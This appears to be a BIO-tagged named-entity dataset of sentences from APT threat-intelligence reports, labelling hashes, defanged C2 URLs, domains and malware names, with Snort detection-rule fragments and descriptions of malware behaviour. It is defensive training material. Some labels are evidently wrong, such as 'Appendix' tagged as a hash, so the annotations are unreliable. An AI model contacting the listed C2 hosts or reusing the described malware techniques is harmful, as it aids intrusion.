e2d0edf2e7d4a09fad732d4113d970a56e9a6667 B-hash
• O
e76da232ec020d133530fdd52ffcc38b7c1d7662 B-hash
• O
e99a03ebe3462d2399f1b819f48384f6714dcba1 B-hash
• O
ea0cfe60a7b7168c42c0e86e15feb5b0c9674029 B-hash
• O
eb851adfada7b40fc4f6c0ae348694500f878493 B-hash
• O
efd41300ccf4143d04664715e1de98cb416ffdd1 B-hash
• O
f2ffc4e1d5faec0b7c03a233524bb78e44f0e50b B-hash
• O
f33c980d4b6aaab1dc401226ab452ce840ad4f40 B-hash
• O
f38040c70024fe9e305af5a3687e0d5993bb9e96 B-hash
• O
f7693e5d39db067d97cd91fb22522f94c59fda3d B-hash
• O
f7d47c38eca7ec68aa478c06b1ba983d9bf02e15 B-hash
• O
fb1b1dc288d68f695f88c5ac036b3ab1c4f5e850 B-hash
• O
feb9424386af47d550b13614c78530bc06ec876e B-hash

I O
was O
able O
to O
compile O
a O
custom O
controller O
from O
the O
source O
code O
for O
the O
purposes O
of O
testing O
the O
Ghost O
Dragon O
malware O
. O

The O
server O
will O
acknowledge O
the O
handshake O
by O
sending O
a O
64 O
byte O
random O
buffer O
with O
the O
same O
pattern O
for O
the O
3 O
and O
8 O
DWORDs O
based O
on O
the O
new O
, O
randomly O
generated O
1 O
DWORD O
( O
offset O
0 O
) O
. O

During O
this O
time O
period O
, O
we O
observed O
the O
following O
domains O
resolving O
to O
: O
ph.moafee[.]com B-url.unknown
afp.mozjlla[.]com B-url.unknown
mofa.mozjlla[.]com B-url.unknown
acer.moafee[.]com B-url.unknown
del.moafee[.]com B-url.unknown
jnt.moafee[.]com B-url.unknown
pcg.moafee[.]com B-url.unknown
sslc.moafee[.]com B-url.unknown
at.moafee[.]com B-url.unknown
lw.moafee[.]com B-url.unknown
ks.moafee[.]com B-url.unknown
oa.moafee[.]com B-url.unknown
xxpp.moafee[.]com B-url.unknown
hp.moafee[.]com B-url.unknown
gumm.mozjlla[.]com B-url.unknown
msn.moafee[.]com B-url.unknown
During O
this O
same O
time O
frame O
, O
the O
HTRAN O
client O
was O
observed O
attempting O
to O
connect O
to O
a O
number O
of O
different O
backend O
HTRAN O
servers O
. O

One O
such O
toolset O
, O
the O
ScanBox B-malware.infosteal
framework O
, O
is O
now O
shared O
between O
a O
number O
of O
groups O
who O
conduct O
espionage O
attacks O
. O

checkDrives O

If O
the O
list O
does O
not O
contain O
any O
item O
, O
or O
if O
the O
verification O
has O
failed O
, O
the O
ZxShell B-malware.backdoor
sample O
tries O
to O
connect O
to O
a O
hardcoded O
host O
with O
the O
goal O
of O
retrieving O
a O
new O
updated O
list O
. O

There O
were O
also O
a O
few O
thousand O
files O
in O
the O
account O
that O
were O
later O
deleted O
. O

The O
scripts O
will O
then O
be O
decoded O
and O
dropped O
to O
execute O
the O
payload O
without O
needing O
to O
Search O
: O

Figure O
3 O
: O
Cleaned O
Script O
Originally O
by O
JPCERT O

sppsvc.exe B-malware.unknown
: O

Based O
upon O
some O
cursory O
analysis O
the O
backdoor O
will O
look O
for O
encrypted O
commands O
within O
HTML O
comments O
returned O
from O
the O
C2 O
using O
the O
following O
format O
: O
however O
, O
the O
C2 O
was O
not O
active O
at O
the O
time O
of O
analysis O
so O
this O
could O
not O
be O
confirmed O
. O

Digital O
signature/signing O
date O

38 O
The O
statement O
prompted O
denials O
from O
the O
Russian O
Government O
, O
with O
Russian O
sports O
minister O
Vitaly O
Mutko O
asking O
, O
' O
How O
can O
you O
prove O
that O
the O
hackers O
are O
Russian O
? O

The O
attackers O
spoofed O
the O
email O
id O
associated O
with O
a O
Spain O
based O
equipment O
manufacturing O
company O
Hidrofersa O
which O
specializes O
in O
designing O
, O
manufacturing O
naval O
, O
industrial O
and O
mining O
machinery O
. O

Include O
the O
JAR O
reference O
number O
( O
JAR-16-20296 O
A O
) O
in O
the O
subject O
line O
of O
all O
email O
correspondence O
. O

It O
is O
possible O
that O
the O
deployment O
of O
this O
malware O
infected O
application O
may O
have O
contributed O
to O
the O
high-loss O
nature O
of O
this O
platform O
. O

For O
instance O
, O
the O
payload O
checks O
the O
EAT O
of O
' O
wininet.dll O
' O
using O
the O
comparisons O
mentioned O
above O
to O
find O
the O
address O
to O
the O
' O
DeleteUrlCacheEntryA O
' O
API O
function O
. O

The O
first O
parameter O
of O
ZwContinue O
is O
a O
pointer O
to O
the O
CONTEXT O
structure O
. O

2.3 O
. O

B6C8A6D6C35428779C5C65C1B273EBA0 B-hash
menu.dyndns.biz B-url.cncsvr
US O

A O
shortcut B-malware.drop
file O
( O
.LNK B-malware.drop
) O
was O
also O
seen O
in O
the O
.RAR B-malware.drop
file O
, O
which O
used O
a O
folder O
icon O
to O
make O
users O
believe O
it O
was O
another O
folder O
. O

Babar B-malware.drop
is O
able O
to O
sniff O
all O
keystrokes O
happening O
on O
the O
same O
desktop O
as O
its O
invisible O
window O
. O

After O
compromising O
a O
victim O
organization O
, O
APT28 B-malware.infosteal
will O
steal O
internal O
data O
that O
is O
then O
leaked O
to O
further O
political O
narratives O
aligned O
with O
Russian O
interests O
. O

createDecryptPacket O
: O
] O

Finally O
, O
it O
completes O
its O
laborious O
calculations O
by O
decrementing O
EBX O
by O
one O
, O
yielding O
a O
final O
answer O
of O
890 O
. O

On O
May O
8 O
, O
2018 O
President O
Trump O
announced O
that O
the O
United O
States O
would O
not O
renew O
the O
waivers O
on O
sanctions O
against O
Iran O
. O

Clues O
regarding O
the O
profiles O
of O
the O
attackers O
was O
also O
found O
, O
including O
those O
connected O
to O
developers O
and O
at O
least O
one O
operator O
. O

Releasing O
complete O
IP O
addresses O
in O
the O
past O
has O
not O
proved O
useful O
, O
as O
the O
servers O
are O
quickly O
shut O
down O
and O
relocated O
. O

Remcom O
: O
An O
open-source O
alternative O
to O
PsExec O
, O
which O
is O
a O
Microsoft O
Sysinternals O
tool O
used O
for O
executing O
processes O
on O
other O
systems O
. O

A O
few O
months O
ago O
, O
one O
of O
our O
customers O
contacted O
us O
regarding O
strange O
messages O
he O
received O
on O
Facebook O
Messenger O
. O

Random O
string O
4 O
. O

If O
you O
use O
our O
endpoint O
protection O
product O
, O
CylancePROTECT® O
, O
you O
were O
already O
protected O
from O
this O
attack O
. O

Instead O
, O
it O
uses O
one O
of O
the O
recently O
disclosed O
code O
execution O
techniques O
leveraging O
INF O
and O
SCT O
files O
, O
which O
we O
will O
go O
on O
to O
explain O
later O
in O
the O
blog O
. O

The O
OceanLotus O
group O
, O
also O
known O
as O
APT32 O
and O
APT-C-00 O
, O
is O
infamous O
for O
its O
campaigns O
targeting O
the O
eastern O
part O
of O
Asia O
. O

The O
process O
is O
detailed O
below O
: O
1 O
. O

Before O
installing O
itself O
as O
a O
Windows O
service O
, O
the O
malware O
checks O
for O
the O
presence O
of O
either O
360 O
Safe O
Guard O
or O
360 O
Internet O
Security O
by O
reading O
following O
registry O
keys O
: O

DarkComet B-malware.backdoor
has O
been O
studied O
by O
a O
number O
of O
researchers O
. O

It O
is O
unlikely O
that O
CSRI O
would O
have O
a O
valid O
business O
interest O
with O
Spanish O
government O
departments O
, O
so O
the O
large O
volume O
of O
data O
transferred O
between O
the O
two O
networks O
over O
such O
a O
short O
period O
of O
time O
is O
a O
conspicuous O
indicator O
of O
possibly O
malicious O
activity O
. O

Another O
backdoor O
used O
an O
otherwise O
legitimate O
DLL O
filename O
padded O
with O
a O
non-printing O
OS O
command O
control O
code O
. O

Are O
Patchwork O
and O
Confucius O
the O
same O
group O
? O

index.asp O
index.php O
index.jsp O
index.css O
home.asp O

©2013 O
by O
Trend O
Micro O
, O
Incorporated O
. O

This O
presumably O
gives O
them O
RDP O
access O
to O
the O
compromised O
computer O
. O

The O
HWP O
file O
format O
is O
similar O
to O
Microsoft O
Word O
documents O
, O
but O
supported O
by O
Hangul O
, O
a O
South O
Korean O
word O
processing O
application O
from O
the O
Hancom O
Office O
bundle O
. O

Case O
expansion O
is O
the O
process O
of O
mapping O
out O
connections O
with O
other O
cases O
and O
malwares O
to O
understand O
the O
larger O
threat O
picture O
. O

2017 O
. O

Much O
of O
the O
Crouching B-malware.drop
Yeti I-malware.drop
intrusions O
were O
enabled O
by O
trojanizing O
legitimate O
ICS-related O
IT O
software O
installers O
like O
SCADA O
environment O
vpn O
client O
installers O
and O
industrial O
camera O
software O
driver O
installers O
. O

Exhibit O
8 O
: O
Maltego O
Graph O
Showing O
Campaigns O
Overlap O

File O
Name O
: O
b9af5f5fd434a65d7aa1b55f5441c90a.dll O
File O
Size O
: O
22016 O
bytes O
MD5 O
: O
b9af5f5fd434a65d7aa1b55f5441c90a B-hash
SHA1 O
: O
9b1e902103f7e23d915f4d01c84779e0bdca6995 B-hash
PE O
Time O
: O
0x55372A7A O
[ O
Wed O
Apr O
22 O
04:58:34 O
2015 O
UTC O
] O
PEID O
Sig O
: O
Microsoft O
Visual O
C++ O
v6.0 O
DLL O
Sections O
( O
4 O
) O
: O
Name O
Entropy O
MD5 O
.text O
6.46 O
5c3d9bac10a06111e2bb1356bce6140a B-hash
.rdata O
4.64 O
76ae6bd3bce3f1fb9a86b9faac9b42be B-hash
.data O
0.0 O
bf619eac0cdf3f68d496ea9344137e8b B-hash
.reloc O
4.28 O
4e2b7dd08fa32594616a1d463e9b0975 B-hash

Indicates O
error O
copying O
setup35.exe O
Indicates O
error O
opening O
AutoRun.inf O
for O
binary O
write O
Indicates O
could O
not O
create O
AutoRun.inf O
Indicates O
could O
not O
copy O
netu3.dll/setup35.exe O
' O
! O
Get O
volume O
path O
= O
% O
s O
' O
' O
! O
Get O
disk O
memory O
' O

GetCurrentDirectoryA O
( O
0x400u O
, O
& O
ret O
> O
message O
) O
) O
> O
command O
= O
GetLastError O
( O
) O
; O
FormatMessageA O
( O
0x1000u O
, O
0 O
, O
> O
command O
, O
0 O
, O
& O
ret O
> O
message O
, O
0x400u O
, O
0 O
) O
; O
> O
len O
+= O
lstrlenA O
( O
& O
ret O
> O
message O
) O
+ O
1 O
; O
internet_connect O
( O
struct_this_7 O
* O
) O

Main O
Threat O
Vectors O

Source O
: O
https://www.passivetotal.org/passive/192.52.167.118 B-url.normal
IP O
address O
204.152.203.99 B-ip.unknown
is O
newer O
and O
has O
been O
in O
use O
since O
May O
: O
Source O
: O
https://www.passivetotal.org/passive/204.152.203.99 B-url.normal
Below O
are O
the O
active O
IPs O
used O
for O
command O
and O
control O
or O
for O
delivery O
: O

As O
we O
wanted O
to O
use O
Fiddler O
to O
get O
a O
better O
understanding O
on O
the O
network O
activity O
of O
the O
malware O
, O
we O
manually O
patched O
the O
routine O
so O
it O
would O
not O
detect O
the O
Fiddler O
mutex O
. O

The O
code O
of O
this O
module O
is O
loaded O
directly O
into O
the O
exploited O
application O
and O
has O
several O
methods O
of O
payload O
execution O
. O

August O
2016 O
- O
Black O
Hat O
USA O
Table O
of O
Contents O
Abstract O
Operation B-malware.ransom
Manul I-malware.ransom
Victims O
of O
Operation B-malware.ransom
Manul I-malware.ransom
JRat B-malware.backdoor
Malware O
Family O
JRat B-malware.backdoor
Functionality O
Anti-Analysis O
Bandook B-malware.unknown
Malware O
Family O
Core O
Functionality O
Network O
Indicators O
and O
Modularity O
Attribution O
Observed O
Links O
to O
the O
Government O
of O
Kazakhstan O
Observed O
Links O
to O
Arcanum O
Global O
Intelligence O
Observed O
Links O
To O
Appin O
Other O
Possible O
Targets O
Conclusion O
Acknowledgements O
Appendix B-hash
A O
: O
Indicators O
of O
Compromise O
C2 O
Servers O
Hashes O
Appendix B-url.normal
B O
: O
Further O
Reading O

The O
malware O
then O
downloads O
the O
updated O
executable O
and O
drops O
it O
in O
the O
% O
Appdata O
% O
\SQLite O
directory O
as O
shown O
in O
the O
below O
screen O
shots O
. O

The O
following O
SNORT O
rules O
have O
been O
released O
by O
the O
Emerging O
Threats O
project O
to O
detected O
the O
fi O
nal O
payload O
command O
and O
control O
communications O
. O

Koadic B-malware.unknown
's O
communication O
traffic O

hxxp://104.237.218(.)67:80/icon.ico B-url.cncsvr
6dc7bd14b93a647ebb1d2eccb752e750c4ab6b09 B-hash
hxxp://support.chatconnecting(.)com:80/icon.ico B-url.cncsvr
c41972517f268e214d1d6c446ca75e795646c5f2 B-hash
hxxp://food.letsmiles(.)org/login.txt B-url.cncsvr
9f95b81372eaf722a705d1f94a2632aad5b5c180 B-hash
hxxp://food.letsmiles(.)org/9niL B-url.cncsvr
5B4459252A9E67D085C8B6AC47048B276C7A6700 B-hash
hxxp://23.227.196(.)210:80/logscreen.jpg B-url.cncsvr
d8f31a78e1d158032f789290fa52ada6281c9a1f B-hash
50fec977ee3bfb6ba88e5dd009b81f0cae73955e I-hash
hxxp://45.114.117(.)137/eXYF B-url.cncsvr
D1E3D0DDE443E9D294A39013C0D7261A411FF1C4 B-hash
91BD627C7B8A34AB334B5E929AF6F981FCEBF268 I-hash
hxxp://images.verginnet(.)info:80/ppap.png B-url.cncsvr
F0A0FB4E005DD5982AF5CFD64D32C43DF79E1402 B-hash
hxxp://176.107.176(.)6/QVPh B-url.cncsvr
8FC9D1DADF5CEF6CFE6996E4DA9E4AD3132702C B-hash
hxxp://108.170.31(.)69/a B-url.cncsvr
4a3f9e31dc6362ab9e632964caad984d1120a1a7 B-hash
hxxp://support(.)chatconnecting(.)com/pic.png B-url.cncsvr
bb82f02026cf515eab2cc88faa7d18148f424f72 B-hash
hxxp://blog.versign(.)info/access/?version=4&lid= B-url.cncsvr
[ I-url.cncsvr
reda I-url.cncsvr
cted I-url.cncsvr
] I-url.cncsvr
& I-url.cncsvr
token= I-url.cncsvr
[ I-url.cncsvr
redacted I-url.cncsvr
] O
9e3971a2df15f5d9eb21d5da5a197e763c035f7a B-hash
hxxp://23.227.196(.)210/6tz8 B-url.cncsvr
bb82f02026cf515eab2cc88faa7d18148f424f72 B-hash
hxxp://23.227.196(.)210/QVPh B-url.cncsvr
8fc9d1dadf5cef6cfe6996e4da9e4ad3132702c5 B-hash
hxxp://45.114.117(.)137/3mkQ B-url.cncsvr
91bd627c7b8a34ab334b5e929af6f981fcebf268 B-hash
hxxp://176.223.111(.)116:80/download/sido.jpg B-url.cncsvr
5934262D2258E4F23E2079DB953DBEBED8F07981 B-hash
hxxp://110.10.179(.)65:80/ptF2 B-url.cncsvr
DA2B3FF680A25FFB0DD4F55615168516222DFC10 B-hash
hxxp://110.10.179(.)65:80/download/microsoftp.jpg B-url.cncsvr
23EF081AF79E92C1FBA8B5E622025B821981C145 B-hash
hxxp://110.10.179(.)65:80/download/microsoft.jpg B-url.cncsvr
C845F3AF0A2B7E034CE43658276AF3B3E402EB7B B-hash
hxxp://27.102.70(.)211:80/image.jpg B-url.cncsvr
9394B5EF0B8216528CED1FEE589F3ED0E88C7155 B-hash

Eleven O
of O
the O
links O
were O
clicked O
once O
, O
four O
were O
clicked O
twice O
, O
two O
were O
clicked O
three O
times O
, O
and O
two O
were O
clicked O
four O
times O
. O

Figure O
9 O
- O
Registry O
Entrenchment O
Entry O
The O
RAT B-malware.backdoor
Installer O
also O
sets O
the O
entrenchment/persistence O
mechanism O
for O
the O
payload O
malware O
. O

varc=newSystem.Diagnostics.ProcessStartInfo O
( O
System.Text.Encoding.GetEn-coding O
( O
65001 O
) O
. O

Map O
of O
top O
affected O
countries O
by O
targeted O
attacks O
Sectors O
affected O
by O
targeted O
attacks O

The O
VBS O
script O
acts O
as O
a O
downloader O
for O
further O
malicious O
payloads O
from O
a O
distribution O
server O
, O
as O
shown O
in O
the O
diagram O
below O
. O

Pasting O
Bitly O
URLs O
, O
appended O
with O
a O
plus O
sign O
, O
into O
the O
address O
bar O
of O
a O
web O
browser O
reveals O
the O
full O
URL O
. O

Ultimately O
this O
PowerShell O
implant O
will O
be O
set O
to O
automatically O
start O
daily O
at O
2 O
am O
via O
a O
scheduled O
task O
( O
shown O
below O
) O
. O

This O
prevents O
easy O
detection O
by O
MD5 O
or O
signatures O
of O
the O
second O
stage O
payload O
. O

Trojan/Win32.MSShell B-malware.infosteal
ab.exe B-malware.drop
44BCF2DD262F12222ADEAB6F59B2975B B-hash
72.0 O
KB O
( O
73,802 O
bytes O
) O
BinExecute/Microsoft.EXE O
[ O
: O
X86 O
] O
2009-05-10 O
07:02:12 O
Unknown O
Microsoft O
Visual O
C++ O

flame O
malware O
windows O
matousec O
microsoft O
microsoft O
windows O
mobile O
network O
news O

Word O
document O
contained O
in O
EXE O
file O
926235FCF7B91442A405B5760A0729EB B-hash

Targeted O
attacks O
discovered O
by O
industry O

Agent.RUI O
Win32/TrojanDropper O
. O

Figure O
7 O
- O
Simple O
Sandbox O
Detection O
Check O
via O
Mouse O
Movement O
The O
RAT B-malware.backdoor
Installer O
contains O
an O
obfuscated O
malicious O
DLL O
payload O
, O
which O
it O
rebuilds O
and O
installs O
. O

It O
's O
a O
.NET O
wrapper O
for O
the O
Windows O
Task O
Scheduler O
The O
second O
is O
the O
G2 O
version O
of O
GravityRAT B-malware.drop
This O
variant O
shares O
the O
same O
command O
and O
control O
( O
C2 O
) O
servers O
as O
G1 O
, O
however O
, O
we O
have O
an O
additional O
' O
payload O
' O
variable O
added O
to O
G2 O
. O

The O
following O
factors O
reveal O
the O
attackers O
intention O
to O
remain O
stealthy O
and O
to O
gain O
long-term O
access O
by O
evading O
analysis O
and O
security O
monitoring O
at O
both O
the O
desktop O
and O
network O
levels O
. O

Until O
it O
checks O
in O
with O
its O
C2 O
controller O
, O
the O
RAT B-malware.backdoor
server O
searches O
for O
the O
encrypted O
confi O
guration O
buffer O
containing O
the O
C O
& O
Cs O
that O
will O
get O
decrypted O
using O
an O
AES O
key O
derived O
from O
a O
hardcoded O
string O
' O
Mother360 O
' O
. O

Network O
Segmentation O
and O
Segregation O
into O
Security O
Zones O
– O
Segment O
networks O
into O
logical O
enclaves O
and O
restrict O
host-to-host O
communications O
paths O
. O

That O
's O
why O
so O
many O
systems O
in O
Ukraine O
were O
affected O
by O
this O
attack O
. O

• O
Java/1.8.0_25 O
• O
Java/1.8.0_26 O
• O
Mozilla/5.0 O
( O
Windows O
NT O
6.1 O
; O
WOW64 O
; O
Trident/7.0 O
; O
iTunes/12.0.1 O
( O
Windows O
; O
N O
) O
rv:11.0 O
) O
like O
Gecko O
• O
Mozilla/5.0 O
( O
Windows O
NT O
6.1 O
; O
WOW64 O
; O
rv:32.0 O
) O
Gecko/20100101 O
Firefox/32.0 O
• O
Mozilla/5.0 O
( O
Windows O
NT O
6.1 O
; O
WOW64 O
) O
AppleWebKit/537.36 O
( O
KHTML O
, O
like O
Gecko O
) O
Chrome O
/34.0.1847.137 O
Safari/537.36 O

key O
= O
0x1D O
# O
Keys O
may O
vary O
depending O
on O
the O
sample O
for O
i O
in O
range O
( O
0 O
, O
length O
) O
: O
buf O
[ O
i O
] O
= O
chr O
( O
ord O
( O
buf O
[ O
i O
] O
) O
^ O
key O
) O
key O
+= O
0x5D O
key O
& O
=0xff O

The O
unique O
username O
moayy2ad O
enabled O
us O
to O
find O
plenty O
of O
information O
on O
the O
attacker O
. O

The O
design O
of O
the O
hack O
bears O
striking O
similarity O
to O
the O
very O
exploits O
that O
have O
made O
Sofacy B-malware.backdoor
so O
feared O
and O
respected O
. O

Given O
that O
we O
know O
when O
information O
about O
these O
APT B-malware.unknown
campaigns O
was O
made O
public O
, O
we O
can O
compute O
the O
number O
of O
days O
it O
took O
the O
security O
community O
to O
publicly O
tie O
the O
samples O
to O
an O
APT B-malware.unknown
campaign O
, O
even O
though O
the O
samples O
had O
been O
marked O
malicious O
for O
other O
reasons O
. O

The O
development O
of O
the O
X-Agent B-malware.infosteal
Android O
malware O
represents O
an O
expansion O
of O
FANCY O
BEAR O
capabilities O
in O
terms O
of O
mobile O
malware O
, O
and O
illustrates O
the O
practical O
application O
of O
full-spectrum O
combat O
as O
envisioned O
in O
the O
eponymous O
doctrinal O
writings O
of O
General O
Valery O
GERASIMOV O
. O

The O
task O
name O
disguise O
helps O
keep O
a O
low O
profi O
le O
and O
evade O
scrutiny O
in O
case O
of O
an O
investigation O
: O

Does O
Kaspersky O
Lab O
detect O
all O
variants O
of O
this O
malware O
? O

And O
later O
2016 O
, O
their O
focus O
turned O
towards O
the O
Olympics O
' O
and O
the O
World O
Anti-Doping O
Agency O
( O
WADA O
) O
and O
Court O
of O
Arbitration O
for O
Sports O
( O
CAS O
) O
, O
when O
individuals O
and O
servers O
in O
these O
organizations O
were O
phished O
and O
compromised O
. O

Although O
we O
did O
not O
notice O
the O
correlation O
immediately O
, O
there O
is O
good O
overlap O
between O
the O
groups O
we O
've O
described O
above O
, O
and O
the O
clusters O
of O
activity O
described O
as O
sharing O
a O
Flash O
0-day O
in O
early O
2014 O
by O
Symantec O
. O

The O
domain O
news.grouptumbler.com O
is O
currently O
resolving O
to O
173.194.70.101 O

The O
victim O
has O
been O
under O
constant O
attack O
acted O
by O
APT-C-06 O
since O
2015 O
. O

ASCII O
to O
Integer O
Conversion O

Meltdown O
and O
Spectre O
: O
Yes O
, O
your O
device O
is O
likely O
vulnerable O

tomhanks542@gmail[.]com O
. O

It O
is O
unclear O
whether O
these O
were O
leased O
or O
hijacked O
, O
but O
the O
fact O
that O
many O
of O
them O
appear O
to O
follow O
a O
pattern—with O
the O
latter O
three O
numbers O
of O
each O
address O
often O
running O
in O
sequence—makes O
it O
likely O
they O
were O
deliberately O
selected O
by O
the O
attackers O
. O

It O
then O
uses O
register O
EBX O
to O
do O
some O
rather O
' O
inefficient O
' O
operations O
. O

The O
first O
piece O
of O
new O
functionality O
is O
that O
the O
attackers O
build O
a O
possible O
list O
of O
drive O
names O
( O
A-Z O
) O
and O
scan O
for O
the O
existence O
of O
each O
drive O
: O

Some O
of O
the O
more O
recent O
revoked O
certificates O
include O
ones O
that O
belong O
to O
Xuchang O
Hongguang O
Technology O
Co O
. O

Given O
the O
inherent O
nature O
of O
threat O
intelligence O
, O
the O
content O
contained O
in O
this O
alert O
is O
based O
on O
information O
gathered O
and O
understood O
at O
the O
time O
of O
its O
creation O
. O

Use O
of O
the O
Framework O
is O
strictly O
voluntary O
. O

Note O
that O
both O
the O
subjects O
, O
' O
Transfer O
investigation O
report O
' O
and O
' O
Confirm O
transactions O
before O
release O
' O
are O
comparatively O
unique O
as O
are O
the O
senders O
, O
' O
Police O
Department O
' O
cmmds@sbt.co[.]in O
and O
Arthur O
Anderson O
alexanderharolds@arthurandersen[.]com O
. O

2016 O
. O

' O
Referer O
: O
' O
; O
http_header O
; O
reference O
: O
md5,4dd319a230ee3a0735a656231b4c9063 O
; O
classtype O
: O
trojan­activity O
; O
metadata O
: O
tlp O
WHITE O
, O
author O
@ O
ipsosCustodes O
; O
sid:99999901 O
; O
rev:2015200401 O
; O
) O
alert O
http O
any O
any O
­ O
> O
any O
any O
( O
msg O
: O
' O
­­ O
[ O
PwC O
CTD O
] O
­­ O
Unclassified O
Middle O
Eastern O
Actor O
­ O
DownExecute B-malware.infosteal
URI O
( O
/dw/setup O
) O
' O
; O
flow O
: O
established O
, O
to_server O
; O
urilen O
: O
> O
8 O
; O
content O
: O
' O
/dw/setup O
' O
; O
http_uri O
; O
depth:9 O
; O
content O
: O
' O
POST O
' O
; O
http_method O
; O
reference O
: O
md5,4dd319a230ee3a0735a656231b4c9063 O
; O
classtype O
: O
trojan­activity O
; O
metadata O
: O
tlp O
WHITE O
, O
author O
@ O
ipsosCustodes O
; O
sid:99999902 O
; O
rev:2015200401 O
; O
) O
alert O
http O
any O
any O
­ O
> O
any O
any O
( O
msg O
: O
' O
­­ O
[ O
PwC O
CTD O
] O
­­ O
Unclassified O
Middle O
Eastern O
Actor O
­ O
DownExecute B-malware.infosteal
Headers O
' O
; O
flow O
: O
established O
, O
to_server O
; O
urilen O
: O
> O
7 O
; O
content O
: O
' O
Accept O
*/* O
' O
; O
http_client_body O
; O
content O
: O
' O
Content­Type O
: O
multipart/form­data\ O
; O
boundary=­­­­­­­­­­­­­­­­­­­­­­­­ O
' O
; O
http_header O
; O
content O
: O
' O
ci_session= O
' O
; O
http_cookie O
; O
depth:11 O
; O
content O
: O
' O
POST O
' O
; O
http_method O
; O
content O
: O
! O

Artefact O
type O

These O
and O
other O
samples O
are O
listed O
below O
: O
# O
MD5 O
Submitted O
From O

takeOutPacket O
: O
: O
: O
] O

Hiding O
infrastructure O
in O
plain O
sight O

Initial O
message O
to O
the O
command O
and O
control O
server O
The O
response O
from O
the O
C O
& O
C O
is O
enclosed O
with O
the O
tag O
< O
CHECK O
> O
< O
/CHECK O
> O
. O

The O
email O
contains O
the O
first O
link O
in O
the O
chain O
, O
a O
word O
document O
, O
containing O
an O
OLE O
binary O
object O
. O

Figure O
17 O
: O
Persistence O
Key O

715f54a077802a0d67e6e7136bcbe340 B-hash
ABRIL O
CmetaS3 O

Library O
Characters O
Offsets O

The O
AES O
key O
structure O
is O
highly O
predictable O
, O
as O
the O
quantum O
for O
updating O
the O
system O
clock O
( O
HKLM\SYSTEM\CurrentControlSet\Services\W32Time\Config\LastClockRate O
) O
is O
set O
to O
0x2625A O
hundred-nanoseconds O
by O
default O
, O
and O
the O
clock O
readings O
that O
comprise O
the O
key O
and O
IV O
are O
taken O
in O
a O
tight O
loop O
: O
0x406EA4 O
: O
8D45C0 O
LEA O
EAX O
, O
[ O
EBP-0x40 O
] O
0x406EA7 O
: O
50 O
PUSH O
EAX O

> O
48,000 O
DDoS O
> O
8 O
months O
Sophistication O
Impact O
# O
of O
Infections O
Losses O
Time O
Before O
Detection O

At O
the O
time O
of O
research O
, O
there O
were O
around O
60 O
victims O
whose O
data O
were O
uploaded O
to O
Confucius-owned O
cloud O
storage O
account O
. O

OriginalFilename O
: O
cdto.dll O
ProductName O
: O
Microsoft O
Corporation O
. O

But O
there O
are O
detractors O
. O

Files O
in O
this O
directory O
were O
found O
to O
be O
screenshots O
, O
keylogger O
data O
, O
audio O
from O
Skype O
calls O
, O
passwords O
and O
more O
. O

The O
kill O
chain O
starts O
with O
an O
email O
containing O
an O
HTML O
attachment O
with O
a O
refresh O
tag O
that O
uses O
a O
Google O
URL O
shortener O
as O
the O
target O
. O

The O
downloader O
has O
low O
detection O
rates O
( O
detected O
by O
only O
4 O
out O
of O
54 O
AV O
products O
) O
. O

Command O
and O
control O
( O
C2 O
) O
domains O
used O
by O
StoneDrill B-malware.backdoor
and O
NewsBeef B-malware.infosteal
in O
Kaspersky O
's O
findings O
were O
found O
to O
share O
an O
SSL O
certificate O
, O
which O
surfaced O
an O
additional O
three O
domains O
in O
research O
by O
the O
Iran O
Cyber O
News O
Agency O
. O

In O
order O
to O
identify O
their O
presence O
, O
not O
only O
can O
you O
gain O
valuable O
insight O
into O
their O
targeting O
from O
intelligence O
reports O
and O
gain O
powerful O
means O
of O
detections O
with O
hunting O
tools O
like O
YARA O
, O
but O
out-of-band O
processing O
with O
a O
solution O
like O
KATA O
is O
important O
. O

SUBMITTER O
CAMPAIGNS O

This O
impersonating O
domain O
was O
also O
registered O
on O
the O
same O
day O
20th O
February O
2017 O
and O
this O
domain O
could O
also O
be O
used O
by O
the O
attackers O
to O
send O
out O
spear-phishing O
emails O
to O
different O
targets O
. O

This O
IP O
address O
is O
associated O
with O
hosting O
provider O
in O
Indonesia O
as O
shown O
in O
the O
screen O
shots O
below O
Below O
screen O
shot O
shows O
the O
timeline O
when O
the O
IP O
address O
was O
active O
. O

In O
other O
cases O
, O
the O
document O
includes O
instructions O
motivating O
the O
victim O
to O
enable O
macro O
code O
execution O
. O

Figure O
12 O
: O
Cobalt O
Strike O
BEACON O
C2 O
The O
following O
FireEye O
products O
currently O
detect O
and O
block O
the O
methods O
described O
above O
. O

ESET O
researchers O
found O
evidence O
that O
supports O
this O
theory O
. O

Australia O
, O
Bahrain O
, O
Bangladesh O
, O
Brunei O
, O
Canada O
, O
Czech O
Republic O
, O
Estonia O
, O
Ethiopia O
, O
Germany O
, O
India O
, O
Indonesia O
, O
Japan O
, O
Latvia O
, O
Malaysia O
, O
Mexico O
, O
Mongolia O
, O
Netherlands O
, O
Qatar O
, O
Serbia O
, O
Singapore O
, O
Turkmenistan O
, O
United O
Arab O
Emirates O
, O
United O
Kingdom O
, O
United O
States O
, O
Vietnam O
. O

Ch O
3.20 O
: O
7872c1d88fe21d8a85f160a6666c76e8 B-hash
Ch O
3.25 O
: O
ec7e3cfaeaac0401316d66e964be684e B-hash
Code O
similarity O
: O
91 O
% O
In O
the O
3.25 O
version O
, O
the O
author O
switched O
to O
the O
CLSID O
: O
42aedc87-2188-41fd-b9a3-0c966feabec1 O
as O
described O
in O
our O
article O
. O

Figure O
3 O
: O
XLSX O
Macro O
Figure O
4 O
contains O
the O
decoded O
output O
of O
the O
encoded O
text O
. O

Third O
, O
we O
show O
the O
results O
from O
the O
AMP O
dataset O
. O

Westdeutscher O
Rundfunk O
. O

The O
core O
of O
the O
CozyDuke B-malware.drop
toolset O
is O
a O
modular O
attack O
platform O
consisting O
of O
a O
main O
component O
augmented O
by O
a O
set O
of O
additional O
modules O
implementing O
further O
functionality O
. O

When O
we O
tracked O
ChessMaster O
back O
in O
November O
, O
we O
noted O
that O
it O
exploited O
the O
SOAP O
WSDL O
parser O
vulnerability O
CVE-2017-8759 O
( O
patched O
in O
September O
2017 O
) O
within O
the O
Microsoft O
.NET O
framework O
to O
download O
additional O
malware O
. O

In O
this O
case O
, O
however O
, O
instead O
of O
dropping O
CozyDuke B-malware.drop
, O
the O
executables O
may O
drop O
other O
executables O
, O
scripts O
or O
DLLs O
. O

All O
of O
these O
functions O
are O
named O
similarly O
to O
Siemens O
S7ProSim O
v5.4 O
COM O
interface O
. O

It O
is O
possible O
the O
authors O
of O
CozyDuke B-malware.drop
were O
trying O
out O
a O
new O
design O
, O
but O
eventually O
decided O
to O
go O
back O
to O
the O
original O
